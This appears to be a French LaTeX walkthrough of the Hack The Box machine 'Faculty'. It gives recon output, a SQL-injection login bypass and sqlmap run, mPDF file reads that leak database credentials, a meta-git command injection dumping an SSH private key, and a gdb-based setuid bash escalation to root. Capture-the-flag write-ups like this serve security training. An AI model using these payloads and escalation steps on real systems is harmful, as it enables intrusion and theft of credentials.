\chapter{Faculty}
\begin{itemize}
    \item {\bf technics}:  cve, command injection, gdb capabilities
    \item {\bf Components}: mpdf,  meta-git
    \item {\bf tools}: 
\end{itemize}


\section{Résumé}


\section{Details}

\subsection{Recon}
\subsubsection{nmap}
\begin{verbatim}
$ sudo nmap -sV -sC -oX nmap.xml 10.10.11.169
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-22 03:59 CEST
Nmap scan report for 10.10.11.169
Host is up (0.064s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e9:41:8c:e5:54:4d:6f:14:98:76:16:e7:29:2d:02:16 (RSA)
|   256 43:75:10:3e:cb:78:e9:52:0e:eb:cf:7f:fd:f6:6d:3d (ECDSA)
|_  256 c1:1c:af:76:2b:56:e8:b3:b8:8a:e9:69:73:7b:e6:f5 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://faculty.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.08 seconds
\end{verbatim}

\subsubsection{web}


\begin{verbatim}
$ ffuf -u http://faculty.htb/FUZZ -e .php 
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

index.php               [Status: 302, Size: 12193, Words: 1896, Lines: 359, Duration: 112ms]
# directory-list-2.3-medium.txt.php [Status: 302, Size: 12193, Words: 1896, Lines: 359, Duration: 113ms]
                        [Status: 302, Size: 12193, Words: 1896, Lines: 359, Duration: 100ms]
# directory-list-2.3-medium.txt [Status: 302, Size: 12193, Words: 1896, Lines: 359, Duration: 112ms]
login.php               [Status: 200, Size: 4860, Words: 270, Lines: 132, Duration: 34ms]
header.php              [Status: 200, Size: 2871, Words: 155, Lines: 48, Duration: 32ms]
admin                   [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 26ms]
test.php                [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 36ms]
topbar.php              [Status: 200, Size: 1206, Words: 199, Lines: 37, Duration: 27ms]
\end{verbatim}

\begin{verbatim}
$ ffuf -u http://faculty.htb/admin/FUZZ -e .php 
    -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt

index.php               [Status: 302, Size: 13897, Words: 2637, Lines: 421, Duration: 107ms]
# or send a letter to Creative Commons, 171 Second Street, [Status: 302, Size: 13897, Words: 2637, Lines: 421, Duration: 108ms]
# Priority ordered case-sensitive list, where entries were found [Status: 302, Size: 13897, Words: 2637, Lines: 421, Duration: 112ms]
home.php                [Status: 200, Size: 2995, Words: 1006, Lines: 106, Duration: 34ms]
login.php               [Status: 200, Size: 5618, Words: 376, Lines: 176, Duration: 30ms]
events.php              [Status: 500, Size: 1193, Words: 51, Lines: 43, Duration: 31ms]
header.php              [Status: 200, Size: 2691, Words: 155, Lines: 48, Duration: 27ms]
users.php               [Status: 200, Size: 1593, Words: 52, Lines: 71, Duration: 31ms]
assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 26ms]
faculty.php             [Status: 200, Size: 8532, Words: 320, Lines: 219, Duration: 49ms]
courses.php             [Status: 200, Size: 8088, Words: 340, Lines: 207, Duration: 34ms]
ajax.php                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 44ms]
schedule.php            [Status: 200, Size: 5553, Words: 640, Lines: 202, Duration: 29ms]
database                [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 44ms]
navbar.php              [Status: 200, Size: 1116, Words: 47, Lines: 29, Duration: 31ms]
subjects.php            [Status: 200, Size: 10278, Words: 375, Lines: 233, Duration: 30ms]
topbar.php              [Status: 200, Size: 1201, Words: 199, Lines: 38, Duration: 29ms]
\end{verbatim}

\begin{verbatim}
http://faculty.htb/admin/users.php


# 	Name 	Username 	Type 	Action
1 	Administrator 	admin 	Admin 


<script>
	$('table').dataTable();
$('#new_user').click(function(){
	uni_modal('New User','manage_user.php')
})
$('.edit_user').click(function(){
	uni_modal('Edit User','manage_user.php?id='+$(this).attr('data-id'))
})
$('.delete_user').click(function(){
		_conf("Are you sure to delete this user?","delete_user",[$(this).attr('data-id')])
	})
	function delete_user($id){
		start_load()
		$.ajax({
			url:'ajax.php?action=delete_user',
			method:'POST',
			data:{id:$id},
			success:function(resp){
				if(resp==1){
					alert_toast("Data successfully deleted",'success')
					setTimeout(function(){
						location.reload()
					},1500)

				}
			}
		})
	}
</script>
\end{verbatim}

\begin{verbatim}
http://faculty.htb/admin/events.php

index.php?page=manage_event
\end{verbatim}

\begin{verbatim}
http://faculty.htb/admin/faculty.php

85662050 Blake, Claire G cblake@faculty.htb (763) 450-0121
30903070 James, Eric P ejames@faculty.htb (702) 368-3689
63033226 Smith, John C jsmith@faculty.htb (646) 559-919

<input type="hidden" id="pdf" value="JTI1M0NoMSUyNTNFJTI1M0NhJTJCbmFtZSUyNTNEJTI1MjJ0b3AlMjUyMiUyNTNFJTI1M0MlMjUyRmElMjUzRWZhY3VsdHkuaHRiJTI1M0MlMjUyRmgxJTI1M0UlMjUzQ2gyJTI1M0VGYWN1bHRpZXMlMjUzQyUyNTJGaDIlMjUzRSUyNTNDdGFibGUlMjUzRSUyNTA5JTI1M0N0aGVhZCUyNTNFJTI1MDklMjUwOSUyNTNDdHIlMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VJRCUyNTNDJTI1MkZ0aCUyNTNFJTI1MDklMjUwOSUyNTA5JTI1M0N0aCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRU5hbWUlMjUzQyUyNTJGdGglMjUzRSUyNTA5JTI1MDklMjUwOSUyNTNDdGglMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0VFbWFpbCUyNTNDJTI1MkZ0aCUyNTNFJTI1MDklMjUwOSUyNTA5JTI1M0N0aCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRUNvbnRhY3QlMjUzQyUyNTJGdGglMjUzRSUyNTNDJTI1MkZ0ciUyNTNFJTI1M0MlMjUyRnRoZWFkJTI1M0UlMjUzQ3Rib2R5JTI1M0UlMjUzQ3RyJTI1M0UlMjUzQ3RkJTJCY2xhc3MlMjUzRCUyNTIydGV4dC1jZW50ZXIlMjUyMiUyNTNFODU2NjIwNTAlMjUzQyUyNTJGdGQlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UlMjUzQ2IlMjUzRUJsYWtlJTI1MkMlMkJDbGFpcmUlMkJHJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFY2JsYWtlJTI1NDBmYWN1bHR5Lmh0YiUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTJCJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFJTI1Mjg3NjMlMjUyOSUyQjQ1MC0wMTIxJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZzbWFsbCUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQyUyNTJGdHIlMjUzRSUyNTNDdHIlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0UzMDkwMzA3MCUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDYiUyNTNFSmFtZXMlMjUyQyUyQkVyaWMlMkJQJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFZWphbWVzJTI1NDBmYWN1bHR5Lmh0YiUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTJCJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFJTI1Mjg3MDIlMjUyOSUyQjM2OC0zNjg5JTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZzbWFsbCUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQyUyNTJGdHIlMjUzRSUyNTNDdHIlMjUzRSUyNTNDdGQlMkJjbGFzcyUyNTNEJTI1MjJ0ZXh0LWNlbnRlciUyNTIyJTI1M0U2MzAzMzIyNiUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDYiUyNTNFU21pdGglMjUyQyUyQkpvaG4lMkJDJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFanNtaXRoJTI1NDBmYWN1bHR5Lmh0YiUyNTNDJTI1MkZiJTI1M0UlMjUzQyUyNTJGc21hbGwlMjUzRSUyNTNDJTI1MkZ0ZCUyNTNFJTJCJTI1M0N0ZCUyQmNsYXNzJTI1M0QlMjUyMnRleHQtY2VudGVyJTI1MjIlMjUzRSUyNTNDc21hbGwlMjUzRSUyNTNDYiUyNTNFJTI1Mjg2NDYlMjUyOSUyQjU1OS05MTkyJTI1M0MlMjUyRmIlMjUzRSUyNTNDJTI1MkZzbWFsbCUyNTNFJTI1M0MlMjUyRnRkJTI1M0UlMjUzQyUyNTJGdHIlMjUzRSUyNTNDJTI1MkZ0Ym9ieSUyNTNFJTI1M0MlMjUyRnRhYmxlJTI1M0U=" />
\end{verbatim}

\begin{verbatim}
<script>
$('#download-pdf').click(function(e) {
		e.preventDefault()
        console.log("Generating PDF...");
		start_load()
		$.ajax({
			url:'download.php',
			data: "pdf=" + $('#pdf').val(),
		    cache: false,
		    contentType: false,
		    processData: false,
			contentType: 'application/x-www-form-urlencoded; charset=UTF-8',
		    method: 'POST',
		    type: 'POST',
			success:function(resp){
					end_load();
					if (resp.includes("OK")) {
						alert_toast("Data successfully generated",'success')
						setTimeout(function(){
							window.open("../mpdf/tmp/" + resp, '_blank');
						},1500)
					} else {
						alert_toast("Error generating pdf",'danger')

					}
			},
			error: function (err) {
				end_load();
				alert_toast("Error generating pdf",'danger')
			}
		})
    });
	$(document).ready(function(){
		$('table').dataTable()
	})
	$('#new_faculty').click(function(){
		uni_modal("New Entry","manage_faculty.php",'mid-large')
	})
	$('.view_faculty').click(function(){
		uni_modal("Faculty Details","view_faculty.php?id="+$(this).attr('data-id'),'')

	})
	$('.edit_faculty').click(function(){
		uni_modal("Manage Job Post","manage_faculty.php?id="+$(this).attr('data-id'),'mid-large')

	})
	$('.delete_faculty').click(function(){
		_conf("Are you sure to delete this topic?","delete_faculty",[$(this).attr('data-id')],'mid-large')
	})

	function delete_faculty($id){
		start_load()
		$.ajax({
			url:'ajax.php?action=delete_faculty',
			method:'POST',
			data:{id:$id},
			success:function(resp){
				if(resp==1){
					alert_toast("Data successfully deleted",'success')
					setTimeout(function(){
						location.reload()
					},1500)

				}
			}
		})
	}
</script>
\end{verbatim}



\begin{verbatim}

	$('#manage-user').submit(function(e){
		e.preventDefault();
		start_load()
		$.ajax({
			url:'ajax.php?action=save_user',
			method:'POST',
			data:$(this).serialize(),
			success:function(resp){
				if(resp ==1){
					alert_toast("Data successfully saved",'success')
					setTimeout(function(){
						location.reload()
					},1500)
				}else{
					$('#msg').html('<div class="alert alert-danger">Username already exist</div>')
					end_load()
				}
			}
		})
	})
\end{verbatim}

donc on se log avec un etudiant puis on accede directement à l'admin
puis 
\verb+http://faculty.htb/admin/index.php?page=users+

autre solution :

\begin{verbatim}
$ sqlmap -r /tmp/login.req --batch

---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 6429 FROM (SELECT(SLEEP(5)))rYKe) AND 'sAyL'='sAyL&password=admin
---

$ sqlmap -r /tmp/login.req  --batch --os-shell
[04:40:42] [INFO] retrieved the web server document root: '/var/www'
[04:40:42] [INFO] retrieved web server absolute paths: '/var/www/scheduling/admin/admin_class.php'
[04:40:42] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method
[04:40:43] [WARNING] unable to upload the file stager on '/var/www/'
[04:40:43] [INFO] trying to upload the file stager on '/var/www/admin/' via LIMIT 'LINES TERMINATED BY' method
[04:40:43] [WARNING] unable to upload the file stager on '/var/www/admin/'
[04:40:43] [INFO] trying to upload the file stager on '/var/www/scheduling/admin/' via LIMIT 'LINES TERMINATED BY' method
[04:40:44] [WARNING] unable to upload the file stager on '/var/www/scheduling/admin/'
[04:40:44] [INFO] trying to upload the file stager on '/var/www/scheduling/admin/admin/' via LIMIT 'LINES TERMINATED BY' method
[04:40:45] [WARNING] unable to upload the file stager on '/var/www/scheduling/admin/admin/'
[04:40:45] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 18 times
[04:40:45] [INFO] fetched data logged to text files under '/home/benmusashi/.local/share/sqlmap/output/faculty.htb'

\end{verbatim}

donc on peut bypass l'auth avec \verb+admin' or 'toto'='+


par contre la fonction d'ajout d'un user ne marche pas.

On va pouvoir tester l'injection 

On a un truc en \verb+/admin/assets/uploads/+

la generation d'un pdf
\verb+http://faculty.htb/mpdf/tmp/OKFH0LgN6zAvEthQ7bwmrMURW3.pdf+

la generation d'un pdf prend la valeur d'un champ caché.

\verb+mpdf+ is a PHP library which generates PDF files from UTF-8 encoded HTML.

\begin{verbatim}
$ searchsploit mpdf
-------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                    |  Path
-------------------------------------------------------------------------------------------------- ---------------------------------
dompdf 0.6.0 beta1 - Remote File Inclusion                                                        | php/webapps/14851.txt
dompdf 0.6.0 - 'dompdf.php?read' Arbitrary File Read                                              | php/webapps/33004.txt
mPDF 5.3 - File Disclosure                                                                        | php/webapps/18248.pl
Slimpdf Reader 1.0 - Memory Corruption                                                            | windows/dos/19391.py
SlimPDF Reader - Denial of Service (PoC)                                                          | windows/dos/17274.txt
TYPO3 Extension ke DomPDF - Remote Code Execution                                                 | php/webapps/35443.txt
-------------------------------------------------------------------------------------------------- ---------------------------------
\end{verbatim}

sauf que
\begin{verbatim}
y$ exiftool OKJmXszqdtx4eyBg6YV1wG7rPh.pdf
Producer                        : mPDF 6.0
\end{verbatim}

\url{https://www.exploit-db.com/exploits/50995}

\url{https://github.com/mpdf/mpdf/issues/356}

\url{https://github.com/P4cm4n90/Exploits/blob/main/mpdf_lfi_exploit.py}

quand on regarde la chaine de pdf incluse elle subit 
\begin{enumerate}
\item url encode
\item url encode
\item base64 encode
\end{enumerate}

on lit alors du \verb+html+

Le truc c'est que le contenu n'est pas lisible directment dans le pdf c'est un
attachement.

\begin{verbatim}
ajax.php:
    include 'admin_class.php';

admin_class.php:
    include 'db_connect.php';

db_connect.php:

<?php
$conn= new mysqli('localhost','sched','Co.met06aci.dly53ro.per','scheduling_db')or die("Could not connect to mysql".mysqli_error($con));
\end{verbatim}

donc:
\begin{itemize}
    \item user: \verb+sched+
    \item passwd: \verb+Co.met06aci.dly53ro.per+
    \item db: \verb+scheduling_db+
\end{itemize}


dans \verb+/etc/passwd+ on a
\begin{verbatim}
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
gbyolo:x:1000:1000:gbyolo:/home/gbyolo:/bin/bash
developer:x:1001:1002:,,,:/home/developer:/bin/bash
\end{verbatim}


on est donc capable de se connecter sur le compte \verb+gbyolo+ avec ce mot de
pass.

\subsection{Foothold}
\subsubsection{gbyolo}

\verb+ssh gbyolo@faculty.htb+ passwd:
\verb+Co.met06aci.dly53ro.per+

pas de flag donc il va falloir probablement passer sur developper.
\begin{verbatim}
$ sudo -l
[sudo] password for gbyolo:
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git

$ cat /usr/local/bin/meta-git
#!/usr/bin/env node

let loaded = false;

if (loaded) return process.kill();

const program = require('commander');
const debug = require('debug')('meta-git');

program
  .command('add', 'Add file contents to the index')
  .command('branch', 'List, create, or delete branches')
  .command('checkout', 'Switch branches or restore working tree files')
  .command('clean', 'Remove untracked files from the working tree')
  .command('clone', 'Clone meta and child repositories into new directories')
  .command('commit', 'Record changes to the repository')
  .command('diff', 'Show changes between commits, commit and working tree, etc')
  .command('fetch', 'Download objects and refs from another repository')
  .command('merge', 'Join two or more development histories together')
  .command('pull', 'Fetch from and integrate with another repository or a local branch')
  .command('push', 'Update remote refs along with associated objects')
  .command('remote', 'Manage set of tracked repositories')
  .command('status', 'Show the working tree status')
  .command('tag', 'Create, list, delete or verify a tag object signed with GPG')
  .command('update', "Clone any repos that exist in your .meta file but aren't cloned locally")
  .parse(process.argv);

loaded = true;

$ ls -l /usr/local/bin/meta-git
lrwxrwxrwx 1 root root 41 Nov 10  2020 /usr/local/bin/meta-git -> ../lib/node_modules/meta-git/bin/meta-git

\end{verbatim}

\url{https://hackerone.com/reports/728040}

a executer depuis un endroit ou developper peut lire (\verb+/tmp+)
\begin{verbatim}
$ sudo -u developer meta-git clone 'sss||cat /home/developer/.ssh/id_rsa'
meta git cloning into 'sss||cat /home/developer/.ssh/id_rsa' at id_rsa

id_rsa:
fatal: destination path 'sss' already exists and is not an empty directory.
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
\end{verbatim}

\subsubsection{developer}

\begin{verbatim}
$ ssh -i ./id_rsa developer@faculty.htb
Last login: Fri Oct 21 23:47:22 2022 from 10.10.14.17
-bash-5.0$ ls
sendmail.sh  user.txt

$ id
uid=1001(developer) gid=1002(developer) groups=1002(developer),1001(debug),1003(faculty)
\end{verbatim}

\begin{verbatim}
$ ./linpeas.sh

-rwsr-xr-x 1 root root 1.2M Apr 18  2022 /usr/bin/bash

$ bash -p
$ whoami
root
\end{verbatim}

en fait cela a été fait avant

\begin{verbatim}
developer@faculty:/tmp$ ps -aux | grep root | grep python
root         732  0.0  0.9  26896 18120 ?        Ss   Aug13   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
developer@faculty:/tmp$ gdb -p 732
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
...
0x00007f7238649967 in __GI___poll (fds=0x1a01a60, nfds=3, timeout=-1) at ../sysdeps/unix/sysv/linux/poll.c:29
29      ../sysdeps/unix/sysv/linux/poll.c: No such file or directory.
(gdb) call (void)system("chmod u+s /bin/bash")
[Detaching after vfork from child process 36079]
(gdb) quit
A debugging session is active.

        Inferior 1 [process 732] will be detached.

Quit anyway? (y or n) y
Detaching from program: /usr/bin/python3.8, process 732
[Inferior 1 (process 732) detached]
developer@faculty:/tmp$ /bin/bash -p
bash-5.0# whoami
root
\end{verbatim}

\begin{verbatim}
########## Checking sudo tokens
# https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens
ptrace protection is enabled (1)
gdb was found in PATH
\end{verbatim}

\url{https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-token}

\section{Theorie}


